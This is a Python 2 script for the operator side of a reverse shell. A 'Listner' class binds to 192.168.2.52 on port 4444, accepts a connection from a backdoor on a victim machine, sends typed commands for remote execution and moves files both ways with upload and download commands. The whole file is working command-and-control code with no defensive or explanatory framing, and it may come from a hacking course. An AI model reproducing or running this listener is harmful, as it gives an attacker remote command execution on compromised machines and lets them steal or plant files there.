import socket
import json
import base64
class Listner:
    def __init__(self,ip,port):
        listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listner.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

        listner.bind((ip,port))

        listner.listen(0)
        print "Waiting for connections\n"
        self.con, addr  = listner.accept()
        print "Got connection from " + str(addr)

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.con.send(json_data)
        #print "sent"
        

    def reliable_recv(self):
        json_data=""
        while True:
            try:
                json_data = json_data +  self.con.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_remote(self,command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.con.close()
            exit()
        return self.reliable_recv()

    def write_file(self,path,data):
        with open(path,"wb") as fw:
            fw.write(base64.b64decode(data))
            return "Download successful!"

    def read_file(self,path):
        with open(path,"rb") as fr:
            return base64.b64encode(fr.read())
    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split()

            try:
                if command[0] == "upload":
                    fc = self.read_file(command[1])
                    command.append(fc)

                result = self.exec_remote(command)
                if command[0]=="download":
                    result = self.write_file(command[1],result)
                
            except Exception as e:
                result = "Command execution error: " + str(e)
            print result

mylistner = Listner("192.168.2.52",4444)
mylistner.run()
